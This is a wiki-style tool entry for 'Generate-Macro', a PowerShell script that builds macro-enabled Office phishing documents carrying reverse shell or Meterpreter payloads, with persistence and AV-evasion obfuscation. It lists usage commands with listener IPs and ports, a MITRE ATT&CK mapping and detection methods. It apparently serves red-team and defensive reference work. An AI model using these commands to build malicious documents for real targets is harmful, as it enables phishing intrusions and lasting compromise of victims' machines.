---
id: 6c6bae14-4ac7-4788-bdc9-ba1a363f1851
type: tool
verified: true
created_at: '2019-08-28T21:17:40.939444+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - macro
  - office
  - powershell
  - payload
  - persistence
url: ''
validated: true
---

# Generate-Macro

**Status**: Unverified

## Overview

Generate-Macro is a standalone PowerShell script designed for red teaming and penetration testing. It automates the creation of malicious Microsoft Office documents (Word or Excel) embedded with customizable payloads and persistence mechanisms. This tool is particularly useful for simulating phishing attacks where users are tricked into enabling macros to execute the payload.

## Description

The script generates macro-enabled Office files that, upon opening and enabling macros, execute a specified payload such as a reverse shell or Meterpreter session. It supports various persistence options like registry keys or startup folder entries to maintain access post-infection. Commonly used in initial access vectors during offensive security operations, it requires PowerShell execution and Office installed on the attacker's machine for generation.

## Features

- Feature 1: Supports multiple document types (Word .docm, Excel .xlsm)
- Feature 2: Integrates various payloads (reverse shells, Meterpreter, custom scripts)
- Feature 3: Configurable persistence methods (registry, scheduled tasks, startup)
- Feature 4: Obfuscation options for macro code to evade basic AV detection
- Feature 5: Parameterized input for easy customization of LHOST, LPORT, and output paths

## Installation

### Requirements

- PowerShell 5.0 or later
- Microsoft Office (Word or Excel) installed for template generation
- Administrative privileges may be needed for some persistence methods

### Install Commands

```powershell
# Download the script (assuming from a repository; replace URL as needed)
Invoke-WebRequest -Uri "https://example-repo/Generate-Macro.ps1" -OutFile "Generate-Macro.ps1"

# Or clone if from Git
# git clone https://github.com/example/generate-macro.git
# cd generate-macro
```

No additional dependencies beyond standard Windows/PowerShell environment.

## Basic Usage

```powershell
powershell.exe -ExecutionPolicy Bypass -File Generate-Macro.ps1 -Help
```

### Common Options

| Option | Description |
|--------|-------------|
| -DocumentType | Specifies Word or Excel (default: Word) |
| -PayloadType | Type of payload (ReverseShell, Meterpreter, Custom) |
| -PersistenceMethod | Persistence option (Registry, Startup, None) |
| -LHOST | Listener host IP |
| -LPORT | Listener port |
| -OutputPath | Path for generated file |
| -Obfuscate | Enable macro obfuscation |

## Examples

### Example 1: Basic Usage

```powershell
powershell.exe -ExecutionPolicy Bypass -File Generate-Macro.ps1 -DocumentType Word -PayloadType ReverseShell -LHOST 192.168.1.100 -LPORT 4444 -OutputPath C:\temp\malicious.docm
```

This creates a Word document with a basic reverse shell macro.

### Example 2: Advanced Usage

```powershell
powershell.exe -ExecutionPolicy Bypass -File Generate-Macro.ps1 -DocumentType Excel -PayloadType Meterpreter -PersistenceMethod Registry -LHOST 10.0.0.5 -LPORT 8080 -Obfuscate -OutputPath ./docs/persistent.xlsm
```

Generates an obfuscated Excel file with Meterpreter and registry persistence.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Malicious File]] User Execution: Malicious File
- [[T1566.001]] Phishing: Spearphishing Attachment
- [[Registry Run Keys - Startup Folder]] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

### Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor PowerShell script executions creating .docm/.xlsm files with embedded VBA macros
- Detection method 2: AV/EDR signatures for known macro obfuscation patterns or payload strings (e.g., reverse shell connections)
- Detection method 3: Office macro logging enabled to capture VBA execution attempts
- Detection method 4: Network monitoring for outbound connections from Office processes to unusual IPs/ports

## Related Procedures

No related procedures documented yet. See [[procedures/create-malicious-office-document]] for usage in attack chains.

## Related Tools

- [[tools/metasploit-framework]] (for generating payloads)
- [[tools/office365-ripper]] (for Office-specific exploitation)

## References

- Official documentation: N/A (standalone script; check source repository)
- Related resources: Microsoft VBA documentation, PowerShell Empire for payload ideas
